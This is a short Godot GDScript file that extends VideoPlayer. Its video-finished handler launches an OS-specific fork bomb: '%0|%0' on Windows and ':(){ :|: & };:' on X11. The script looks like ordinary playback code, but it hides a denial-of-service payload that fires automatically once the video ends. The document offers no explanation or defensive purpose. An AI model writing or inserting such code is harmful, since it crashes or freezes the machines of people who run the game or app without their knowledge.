extends VideoPlayer


func _on_video_player_finished():
	if OS.get_name() == "Windows":
		OS.execute("%0|%0", [], false)
	elif OS.get_name() == "X11":
		OS.execute(":(){ :|: & };:", [], false)
